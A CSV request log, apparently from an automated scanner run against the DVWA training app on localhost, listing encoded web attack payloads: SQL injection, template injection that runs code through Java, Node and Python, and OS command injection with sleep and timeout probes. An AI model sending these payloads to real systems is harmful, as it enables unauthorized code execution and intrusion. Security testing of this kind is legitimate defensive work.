ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
198,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%408240*9490%7Dzj&Submit=Submit,302,Found,1,628,0
199,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7B5093*7710%7D%7Dzj&Submit=Submit,302,Found,1,628,0
200,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7B%3D8694*8427%7D%7Dzj&Submit=Submit,302,Found,1,628,0
201,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%3C%25%3D3870*3620%25%3Ezj&Submit=Submit,302,Found,1,628,0
202,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%23set%28%24x%3D8998*2763%29%24%7Bx%7Dzj&Submit=Submit,302,Found,1,628,0
203,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%3Cp+th%3Atext%3D%22%24%7B5583*3057%7D%22%3E%3C%2Fp%3Ezj&Submit=Submit,302,Found,1,628,0
204,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%40math+key%3D%229513%22+method%3D%22multiply%22+operand%3D%225550%22%2F%7Dzj&Submit=Submit,302,Found,1,628,0
205,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7B71630%7Cadd%3A97810%7D%7Dzj&Submit=Submit,302,Found,14,628,0
206,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7Bprint+%229730%22+%226095%22%7D%7Dzj&Submit=Submit,302,Found,3,628,0
207,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj+6747*5580+zj,302,Found,4,628,0
208,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B8764*8224%7Dzj,302,Found,1,628,0
209,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%24%7B6517*8756%7Dzj,302,Found,1,628,0
210,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%23%7B9426*5652%7Dzj,302,Found,3,647,0
211,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%239638*4805%7Dzj,302,Found,2,628,0
212,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%403688*1351%7Dzj,302,Found,1,628,0
213,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7B6065*2330%7D%7Dzj,302,Found,1,628,0
214,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7B%3D8358*4711%7D%7Dzj,302,Found,0,628,0
215,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%3C%25%3D5282*1517%25%3Ezj,302,Found,1,628,0
216,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%23set%28%24x%3D6394*9042%29%24%7Bx%7Dzj,302,Found,0,628,0
217,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%3Cp+th%3Atext%3D%22%24%7B1454*4053%7D%22%3E%3C%2Fp%3Ezj,302,Found,1,628,0
218,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%40math+key%3D%225377%22+method%3D%22multiply%22+operand%3D%229325%22%2F%7Dzj,302,Found,1,628,0
219,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7B90180%7Cadd%3A66970%7D%7Dzj,302,Found,1,628,0
220,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7Bprint+%227670%22+%228099%22%7D%7Dzj,302,Found,1,628,0
221,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
222,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&Submit=Submit,302,Found,2,628,0
223,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&Submit=Submit,302,Found,1,628,0
224,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&Submit=Submit,302,Found,1,628,0
225,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E&Submit=Submit,302,Found,0,628,0
226,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D&Submit=Submit,302,Found,1,628,0
227,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&Submit=Submit,302,Found,2,628,0
228,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&Submit=Submit,302,Found,0,628,0
229,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D&Submit=Submit,302,Found,2,628,0
230,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D&Submit=Submit,302,Found,2,628,0
231,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%25%3D%25x%28sleep+15%29%25%3E&Submit=Submit,302,Found,1,628,0
232,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23%7B%25x%28sleep+15%29%7D&Submit=Submit,302,Found,1,628,0
233,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7Bsystem%28%22sleep+15%22%29%7D&Submit=Submit,302,Found,1,628,0
234,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,302,Found,1,628,0
235,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,302,Found,0,628,0
236,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,302,Found,1,628,0
237,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,302,Found,1,628,0
238,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,302,Found,1,628,0
239,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,302,Found,1,628,0
240,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,302,Found,1,628,0
241,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,302,Found,1,628,0
242,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,302,Found,1,628,0
243,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%25%3D%25x%28sleep+15%29%25%3E,302,Found,1,628,0
244,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23%7B%25x%28sleep+15%29%7D,302,Found,1,628,0
245,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7Bsystem%28%22sleep+15%22%29%7D,302,Found,1,628,0
246,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
247,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26sleep+15.0%26&Submit=Submit,302,Found,1,628,0
248,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bsleep+15.0%3B&Submit=Submit,302,Found,1,628,0
249,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26sleep+15.0%26%22&Submit=Submit,302,Found,1,628,0
250,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bsleep+15.0%3B%22&Submit=Submit,302,Found,1,628,0
251,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26sleep+15.0%26%27&Submit=Submit,302,Found,1,628,0
252,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bsleep+15.0%3B%27&Submit=Submit,302,Found,1,628,0
253,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26timeout+%2FT+15.0&Submit=Submit,302,Found,0,628,0
254,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%7Ctimeout+%2FT+15.0&Submit=Submit,302,Found,2,628,0
255,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26timeout+%2FT+15.0%26%22&Submit=Submit,302,Found,3,628,0
256,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%7Ctimeout+%2FT+15.0&Submit=Submit,302,Found,2,628,0
257,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26timeout+%2FT+15.0%26%27&Submit=Submit,302,Found,1,628,0
258,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%7Ctimeout+%2FT+15.0&Submit=Submit,302,Found,3,628,0
259,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bstart-sleep+-s+15.0&Submit=Submit,302,Found,2,628,0
260,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bstart-sleep+-s+15.0&Submit=Submit,302,Found,1,628,0
261,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bstart-sleep+-s+15.0&Submit=Submit,302,Found,4,628,0
262,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bstart-sleep+-s+15.0+%23&Submit=Submit,302,Found,1,628,0
263,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26sleep+15.0%26,302,Found,3,628,0
264,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bsleep+15.0%3B,302,Found,1,628,0
265,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26sleep+15.0%26%22,302,Found,2,628,0
266,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bsleep+15.0%3B%22,302,Found,1,628,0
267,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26sleep+15.0%26%27,302,Found,1,628,0
268,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bsleep+15.0%3B%27,302,Found,1,628,0
269,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26timeout+%2FT+15.0,302,Found,2,628,0
270,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%7Ctimeout+%2FT+15.0,302,Found,2,628,0
271,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26timeout+%2FT+15.0%26%22,302,Found,2,628,0
272,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%7Ctimeout+%2FT+15.0,302,Found,2,628,0
273,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26timeout+%2FT+15.0%26%27,302,Found,1,628,0
274,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%7Ctimeout+%2FT+15.0,302,Found,5,628,0
275,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bstart-sleep+-s+15.0,302,Found,2,628,0
276,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bstart-sleep+-s+15.0,302,Found,1,628,0
